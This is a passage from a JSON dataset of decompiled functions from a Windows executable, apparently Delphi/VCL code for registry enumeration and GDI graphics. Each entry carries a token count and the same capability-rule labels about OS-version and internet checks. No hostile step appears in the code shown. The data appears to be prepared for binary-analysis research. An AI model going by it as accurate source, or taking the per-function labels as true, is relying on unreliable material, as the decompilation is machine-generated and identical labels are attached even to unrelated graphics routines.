*in_FS_OFFSET = &stack0xffffff94;\n    uStack112 = 0x4225d6;\n    puStack100 = &stack0xfffffffc;\n    cVar1 = fcn.00421d1c();\n    if (cVar1 != '\\0') {\n        uStack112 = 0x4225ec;\n        fcn.00405620();\n        if (-1 < var_44h + -1) {\n            var_28h = var_44h;\n            dwIndex = 0;\n            do {\n                var_10h = var_40h + 1;\n                uStack112 = 0;\n                uStack116 = 0;\n                uStack120 = 0;\n                uStack124 = 0;\n                puStack128 = &fcn.00422578::var_10h;\n                uStack132 = 0x42261e;\n                uStack132 = fcn.004059dc();\n                iStack136 = dwIndex;\n                uStack108 = hKey;\n                puStack144 = 0x42262c;\n                iVar2 = sub.advapi32.dll_RegEnumKeyExA();\n                if (iVar2 == 0) {\n                    puStack144 = 0x42263c;\n                    fcn.004059dc();\n                    puStack144 = 0x422646;\n                    fcn.00405728();\n                    puStack144 = 0x422654;\n                    var_20h = fcn.00422220();\n                    if (var_20h != 0) {\n                        uStack148 = 0x422760;\n                        uStack152 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff68;\n                        var_1ch = *(*(arg_8h + -4) + 4);\n                        puStack156 = 0x422689;\n                        puStack144 = &stack0xfffffffc;\n                        fcn.004217b0();\n                        uStack160 = 0x422742;\n                        uStack164 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff5c;\n                        puStack168 = 0x42269f;\n                        puStack156 = &stack0xfffffffc;\n                        fcn.004059dc();\n                        puStack168 = 0x4226a9;\n                        fcn.00405728();\n                        puStack168 = 0x4226b7;\n                        fcn.004217b4();\n                        puStack168 = 0x4226bf;\n                        fcn.004059dc();\n                        puStack168 = 0x4226c9;\n                        fcn.00405728();\n                        puStack168 = 0x4226d7;\n                        var_24h = fcn.00422220();\n                        uStack172 = 0x42271f;\n                        uStack176 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff50;\n                        puStack168 = &stack0xfffffffc;\n                        fcn.00422450(arg_8h);\n                        fcn.00422578(arg_8h);\n                        *in_FS_OFFSET = uStack176;\n                        puStack168 = 0x422726;\n                        uStack172 = var_24h;\n                        uStack176 = 0x42271e;\n                        sub.advapi32.dll_RegCloseKey_1();\n                        return;\n                    }\n                }\n                dwIndex = dwIndex + 1;\n                var_28h = var_28h + -1;\n            } while (var_28h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack108;\n    puStack100 = 0x422796;\n    uStack104 = 0x42278e;\n    fcn.004217b0();\n    return;\n}\n",
        "token_count": 1258
    },
    "004227c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004227c4(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    int32_t iStack44;\n    uchar *puStack40;\n    uint uStack36;\n    int32_t iStack32;\n    uchar *puStack28;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4227dd;\n    cVar1 = fcn.004222b8();\n    if (cVar1 != '\\0') {\n        puStack28 = 0x4227ef;\n        cVar1 = fcn.004222b8();\n        if (cVar1 == '\\0') {\n            puStack28 = 0x422801;\n            iVar2 = fcn.00422220();\n            if (iVar2 != 0) {\n                iStack32 = 0x4228a6;\n                uStack36 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffdc;\n                puStack40 = 0x422826;\n                puStack28 = &stack0xfffffffc;\n                fcn.004217b4();\n                puStack40 = 0x422830;\n                iVar3 = fcn.00422220();\n                if (iVar3 != 0) {\n                    iStack44 = 0x422888;\n                    uStack48 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffffd0;\n                    puStack40 = &stack0xfffffffc;\n                    fcn.00422450(&stack0xfffffffc);\n                    fcn.00422578(&stack0xfffffffc);\n                    if (arg_8h != '\\0') {\n                        fcn.00421b84();\n                    }\n                    *in_FS_OFFSET = uStack48;\n                    puStack40 = 0x42288f;\n                    uStack48 = 0x422887;\n                    iStack44 = iVar3;\n                    sub.advapi32.dll_RegCloseKey_1();\n                    return;\n                }\n                *in_FS_OFFSET = uStack36;\n                puStack28 = 0x4228ad;\n                uStack36 = 0x4228a5;\n                iStack32 = iVar2;\n                sub.advapi32.dll_RegCloseKey_1();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 529
    },
    "004239e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004239e0(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x4239fb;\n    iVar2 = fcn.00423954();\n    puStack24 = 0x423a05;\n    fcn.004239c8();\n    uStack28 = 0x423ab4;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    for (var_8h = *(in_EAX + 4); var_8h != NULL; var_8h = *var_8h) {\n        if (iVar2 == *(var_8h + 3)) {\n            cVar1 = fcn.0040995c();\n            if (cVar1 != '\\0') break;\n        }\n    }\n    if (var_8h == NULL) {\n        var_8h = fcn.00402f00();\n        *var_8h = *(in_EAX + 4);\n        var_8h[1] = 0;\n        var_8h[2] = *param_2;\n        *(var_8h + 3) = iVar2;\n        fcn.004030fc();\n        *(in_EAX + 4) = var_8h;\n    }\n    var_8h[1] = var_8h[1] + 1;\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x423abb;\n    uStack28 = 0x423ab3;\n    fcn.004239d4();\n    return;\n}\n",
        "token_count": 427
    },
    "00423ac4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423ac4(uint param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_2 == NULL) {\n        return;\n    }\n    uStack28 = 0x423ae9;\n    fcn.004239c8();\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    param_2[1] = param_2[1] + -1;\n    if (param_2[1] == 0) {\n        puVar1 = *(in_EAX + 4);\n        if (*(in_EAX + 4) == param_2) {\n            *(in_EAX + 4) = *param_2;\n        }\n        else {\n            do {\n                puVar2 = puVar1;\n                puVar1 = *puVar2;\n            } while (puVar1 != param_2);\n            *puVar2 = *param_2;\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    uStack28 = 0x423b53;\n    uStack32 = 0x423b4b;\n    fcn.004239d4();\n    return;\n}\n",
        "token_count": 328
    },
    "00423c80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00423c80(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x423c92;\n    fcn.004239c8();\n    uStack28 = 0x423ce0;\n    iVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    for (puVar2 = *(in_EAX + 4); puVar2 != NULL; puVar2 = *puVar2) {\n        iStack32 = puVar2[2];\n        if ((iStack32 != 0) && (puVar2[5] < 0)) {\n            sub.gdi32.dll_DeleteObject();\n            puVar2[2] = 0;\n            iVar1 = iStack32;\n        }\n        iStack32 = iVar1;\n        iVar1 = iStack32;\n    }\n    *in_FS_OFFSET = iVar1;\n    puStack24 = 0x423ce7;\n    uStack28 = 0x423cdf;\n    iStack32 = iVar1;\n    fcn.004239d4();\n    return;\n}\n",
        "token_count": 304
    },
    "0042420c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042420c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 10) != 0) {\n        (**(in_EAX + 8))();\n    }\n    return;\n}\n",
        "token_count": 53
    },
    "00424cac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00424cac(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) == 0) {\n        puStack28 = 0x424ccb;\n        fcn.004239c8();\n        uStack32 = 0x424d32;\n        iStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        if (*(var_4h + 8) == 0) {\n            var_14h = *(*(var_4h + 0x1c) * 2 + 0x492dfc);\n            var_10h = *(var_4h + 0x18);\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.004241dc();\n            puStack40 = &fcn.00424cac::var_14h;\n            uVar1 = sub.gdi32.dll_CreatePenIndirect();\n            *(var_4h + 8) = uVar1;\n        }\n        *in_FS_OFFSET = puStack40;\n        uStack32 = 0x424d39;\n        iStack36 = 0x424d31;\n        uVar1 = fcn.004239d4();\n        return uVar1;\n    }\n    return *(var_4h + 8);\n}\n",
        "token_count": 395
    },
    "00424f98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00424f98(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) == 0) {\n        puStack24 = 0x424fbb;\n        fcn.004239c8();\n        uStack28 = 0x425066;\n        puStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        if (*(var_4h + 8) == 0) {\n            if (*(var_4h + 0x18) == NULL) {\n                var_8h = 0;\n                uVar1 = *(var_4h + 0x1c);\n                if (uVar1 == 0) {\n                    var_10h = 0;\n                    puStack24 = &stack0xfffffffc;\n                }\n                else if (uVar1 == 1) {\n                    var_10h = 1;\n                    puStack24 = &stack0xfffffffc;\n                }\n                else {\n                    var_10h = 2;\n                    var_8h = (uVar1 & 0x7f) - 2;\n                    puStack24 = &stack0xfffffffc;\n                }\n            }\n            else {\n                var_10h = 3;\n                puStack24 = &stack0xfffffffc;\n                (**(**(var_4h + 0x18) + 0x70))();\n                var_8h = (**(**(var_4h + 0x18) + 0x68))();\n            }\n            var_ch = fcn.004241dc();\n            puStack32 = &fcn.00424f98::var_10h;\n            uVar2 = sub.gdi32.dll_CreateBrushIndirect();\n            *(var_4h + 8) = uVar2;\n        }\n        *in_FS_OFFSET = puStack32;\n        puStack24 = 0x42506d;\n        uStack28 = 0x425065;\n        uVar2 = fcn.004239d4();\n        return uVar2;\n    }\n    return *(var_4h + 8);\n}\n",
        "token_count": 554
    },
    "0042540c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0042540c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uchar *puStack20;\n    uchar auStack16 [8];\n    \n    uVar2 = 0;\n    if ((*(in_EAX + 0x54) & 0x80) != 0) {\n        iVar1 = fcn.004256c0();\n        sub.gdi32.dll_GetWindowOrgEx();\n        puStack20 = auStack16;\n        if (iVar1 != 0) {\n            uVar2 = 1;\n            puStack20 = auStack16;\n        }\n    }\n    return CONCAT44(puStack20, uVar2);\n}\n",
        "token_count": 158
    },
    "00425558": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.00425558(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_1h;\n    \n    uStack16 = 0x49aa30;\n    puStack20 = 0x425569;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack24 = 0x4255a4;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(in_EAX + 0x50) == 0) {\n        puStack20 = &fcn.00425558::var_1h + 1;\n        fcn.0042537c();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4255ab;\n    uStack24 = 0x49aa30;\n    uStack28 = 0x4255a3;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 250
    },
    "00425ad4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425ad4(char param_1, uint *param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffff44;\n    int32_t iStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint *puStack92;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint lpvObject;\n    uint var_30h;\n    uint var_2ch;\n    uint hdcDest;\n    int32_t var_18h;\n    int32_t hdc;\n    int32_t var_10h;\n    uint nWidth;\n    uint nHeight;\n    uint hgdiobj;\n    \n    nWidth = *param_2;\n    nHeight = param_2[1];\n    uStack72 = 0;\n    uStack76 = 0x425af0;\n    hgdiobj = in_EAX;\n    var_18h = sub.gdi32.dll_CreateCompatibleDC();\n    uStack76 = 0;\n    puStack80 = 0x425afa;\n    hdcDest = sub.gdi32.dll_CreateCompatibleDC();\n    uStack84 = 0x425c22;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack92 = &fcn.00425ad4::lpvObject;\n    uStack96 = 0x18;\n    uStack100 = hgdiobj;\n    uStack104 = 0x425b1a;\n    puStack80 = &stack0xfffffffc;\n    sub.gdi32.dll_GetObjectA();\n    if (param_1 != '\\0') {\n        uStack104 = 0;\n        puStack108 = 0x1;\n        uStack112 = 1;\n        iStack116 = nHeight;\n        var_10h = sub.gdi32.dll_CreateBitmap(nWidth);\n        if (var_10h != 0) {\n            iVar1 = sub.gdi32.dll_SelectObject(var_18h, hgdiobj);\n            iVar2 = sub.gdi32.dll_SelectObject(hdcDest, var_10h);\n            sub.gdi32.dll_StretchBlt(hdcDest, 0, 0, nWidth, nHeight, var_18h, 0, 0, var_30h, var_2ch, 0xcc0020);\n            if (iVar1 != 0) {\n                in_stack_ffffff44 = var_18h;\n                sub.gdi32.dll_SelectObject(var_18h, iVar1);\n            }\n            if (iVar2 != 0) {\n                sub.gdi32.dll_SelectObject(hdcDest, iVar2);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffff44;\n        sub.gdi32.dll_DeleteDC(var_18h, 0x425c29);\n        sub.gdi32.dll_DeleteDC(hdcDest);\n        return;\n    }\n    uStack104 = 0;\n    puStack108 = 0x425b3d;\n    hdc = sub.user32.dll_GetDC();\n    if (hdc == 0) {\n        puStack108 = 0x425b4b;\n        fcn.00425a1c();\n    }\n    uStack112 = 0x425b91;\n    iStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    iVar1 = hdc;\n    puStack108 = &stack0xfffffffc;\n    var_10h = sub.gdi32.dll_CreateCompatibleBitmap(hdc, nWidth, nHeight);\n    if (var_10h == 0) {\n        fcn.00425a1c();\n    }\n    *in_FS_OFFSET = iVar1;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x425b98);\n    return;\n}\n",
        "token_count": 883
    },
    "00425c74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00425c74(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h, \n            uint hdc, int32_t arg_28h, int32_t arg_2ch)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    int32_t iStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    int32_t hpal;\n    uint var_20h;\n    uint crColor;\n    uint var_18h;\n    uint hgdiobj;\n    uint hdcDest;\n    uint nYOriginDest;\n    uint nXOriginDest;\n    \n    if (((**0x495d18 == 2) && (arg_18h == arg_2ch)) && (arg_14h == arg_28h)) {\n        uStack56 = 1;\n        puStack60 = 0x1;\n        uStack64 = hdc;\n        uStack68 = 0x425cbc;\n        sub.gdi32.dll_CreateCompatibleBitmap();\n        uStack68 = 0x425cc1;\n        uStack68 = fcn.00425ac4();\n        iStack72 = arg_10h;\n        puStack76 = 0x425cd1;\n        uVar1 = sub.gdi32.dll_SelectObject();\n        uStack80 = 0x425d3c;\n        uStack84 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffac;\n        uVar5 = 0xccaa0029;\n        uVar2 = uVar1;\n        puStack76 = &stack0xfffffffc;\n        sub.gdi32.dll_MaskBlt();\n        *in_FS_OFFSET = in_EAX;\n        uVar2 = sub.gdi32.dll_SelectObject\n                          (arg_10h, uVar1, 0x425ef0, arg_2ch, arg_28h, hdc, arg_20h, arg_1ch, uVar2, arg_ch, arg_8h, \n                           uVar5);\n        sub.gdi32.dll_DeleteObject(uVar2);\n        return;\n    }\n    uStack56 = 0;\n    puStack60 = 0x425d4f;\n    sub.gdi32.dll_CreateCompatibleDC();\n    puStack60 = 0x425d54;\n    uVar2 = fcn.00425ac4();\n    uStack64 = 0x425ee9;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    iStack72 = arg_14h;\n    puStack76 = arg_18h;\n    uStack80 = hdc;\n    uStack84 = 0x425d70;\n    puStack60 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateCompatibleBitmap();\n    uStack84 = 0x425d75;\n    uVar1 = fcn.00425ac4();\n    uStack84 = uVar1;\n    iVar3 = sub.gdi32.dll_SelectObject(uVar2);\n    iVar4 = sub.gdi32.dll_SelectPalette(hdc, *0x49a9fc, 0);\n    sub.gdi32.dll_SelectPalette(hdc, iVar4, 0);\n    if (iVar4 == 0) {\n        hpal = sub.gdi32.dll_SelectPalette(uVar2, *0x49a9fc, 0xffffffff);\n    }\n    else {\n        hpal = sub.gdi32.dll_SelectPalette(uVar2, iVar4, 0xffffffff);\n    }\n    sub.gdi32.dll_RealizePalette(uVar2);\n    sub.gdi32.dll_StretchBlt(uVar2, 0, 0, arg_18h, arg_14h, arg_10h, arg_ch, arg_8h, arg_18h, arg_14h, 0xcc0020);\n    sub.gdi32.dll_StretchBlt(uVar2, 0, 0, arg_18h, arg_14h, hdc, arg_20h, arg_1ch, arg_18h, arg_14h, 0x440328);\n    sub.gdi32.dll_SetTextColor();\n    sub.gdi32.dll_SetBkColor();\n    sub.gdi32.dll_StretchBlt();\n    sub.gdi32.dll_StretchBlt();\n    sub.gdi32.dll_SetTextColor();\n    sub.gdi32.dll_SetBkColor();\n    if (iVar3 != 0) {\n        sub.gdi32.dll_SelectObject(uVar2, iVar3);\n    }\n    sub.gdi32.dll_DeleteObject();\n    *in_FS_OFFSET = uVar1;\n    if (hpal != 0) {\n        sub.gdi32.dll_SelectPalette(uVar2, hpal, 0, 0x425ef0);\n    }\n    sub.gdi32.dll_DeleteDC(uVar2);\n    return;\n}\n",
        "token_count": 1142
    },
    "00426124": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00426124(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffb8;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint hdc;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if (*0x49a9fc != 0) {\n        uStack20 = 0;\n        puStack24 = 0x426141;\n        uVar1 = sub.user32.dll_GetDC();\n        uStack28 = 0x4261aa;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &fcn.00426124::var_1h + 1;\n        iVar2 = sub.gdi32.dll_GetDeviceCaps(uVar1, 0x68);\n        if (0xf < iVar2) {\n            sub.gdi32.dll_GetPaletteEntries(*0x49a9fc, 0, 8, in_EAX + 4);\n            in_stack_ffffffb8 = *0x49a9fc;\n            sub.gdi32.dll_GetPaletteEntries(*0x49a9fc, 8, 8, in_EAX + -0x1c + *(in_EAX + 2) * 4);\n            var_1h._0_1_ = 1;\n        }\n        *in_FS_OFFSET = in_stack_ffffffb8;\n        uVar1 = sub.user32.dll_ReleaseDC(0, uVar1, 0x4261b1);\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 422
    },
    "004261bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004261bc(void)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    uint uVar4;\n    uint uStack1080;\n    uint32_t uStack1076;\n    uint uStack1072;\n    uint32_t uStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uchar *puStack1056;\n    uint32_t uStack1052;\n    uint uStack1048;\n    uint uStack1044;\n    ushort uStack1040;\n    \n    uStack1040 = 0x300;\n    if (in_EAX == 0) {\n        uStack1044 = 0x42621f;\n        fcn.004030fc();\n    }\n    else {\n        uStack1044 = 0;\n        uStack1048 = 0x4261da;\n        uVar3 = sub.gdi32.dll_CreateCompatibleDC();\n        puStack1056 = 0x4261e3;\n        uStack1052 = uVar3;\n        uVar4 = sub.gdi32.dll_SelectObject();\n        puStack1056 = &stack0xfffffbe8;\n        uStack1060 = 0x100;\n        uStack1064 = 0;\n        uStack1072 = 0x4261f7;\n        uStack1068 = uVar3;\n        uVar2 = sub.gdi32.dll_GetDIBColorTable();\n        uStack1068 = uStack1068 & 0xffff | uVar2 << 0x10;\n        uStack1080 = 0x426203;\n        uStack1076 = uVar3;\n        uStack1072 = uVar4;\n        sub.gdi32.dll_SelectObject();\n        uStack1080 = uVar3;\n        sub.gdi32.dll_DeleteDC();\n    }\n    if (uStack1080._2_2_ != 0) {\n        if ((uStack1080._2_2_ != 0x10) || (cVar1 = fcn.00426124(),  cVar1 == '\\0')) {\n            fcn.00425fb8();\n        }\n        uVar4 = sub.gdi32.dll_CreatePalette(&stack0xfffffbc8);\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 524
    },
    "00426260": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00426260(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iStack44;\n    \n    if (((in_EAX != 0) && (iVar1 = sub.gdi32.dll_GetObjectA(),  iVar1 != 0)) && (in_EAX != 0)) {\n        sub.gdi32.dll_GetPaletteEntries();\n        fcn.00425fb8();\n        iStack44 = in_EAX;\n    }\n    return CONCAT44(iStack44, iStack44);\n}\n",
        "token_count": 119
    },
    "004262b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004262b4(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    int32_t iStack76;\n    uint uStack68;\n    int32_t iStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint lpbInit;\n    uint hdc;\n    uint var_ch;\n    uint var_8h;\n    uint lpbmih;\n    \n    *(in_EAX + 8) = *(in_EAX + 8) >> 1;\n    uStack40 = 0x4262e2;\n    iVar1 = fcn.00425c54();\n    *(in_EAX + 0x14) = iVar1 * *(in_EAX + 8);\n    uStack40 = 0x4262fa;\n    iVar1 = fcn.00425c34();\n    uStack40 = 0;\n    puStack44 = 0x426303;\n    iStack76 = sub.user32.dll_GetDC();\n    if (iStack76 == 0) {\n        puStack44 = 0x426311;\n        fcn.004259c8();\n    }\n    uStack48 = 0x426461;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    iStack64 = in_EAX + 0x28 + iVar1 * 4;\n    uStack56 = 0;\n    uStack68 = 4;\n    puStack80 = 0x42634b;\n    puStack44 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateDIBitmap();\n    puStack80 = 0x426350;\n    uVar2 = fcn.00425ac4();\n    uStack84 = 0x426387;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    uVar3 = fcn.00425ad4();\n    *in_EDX = uVar3;\n    *in_FS_OFFSET = uStack88;\n    puStack80 = 0x42638e;\n    uStack88 = 0x426386;\n    uStack84 = uVar2;\n    sub.gdi32.dll_DeleteObject();\n    return;\n}\n",
        "token_count": 569
    },
    "00426510": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
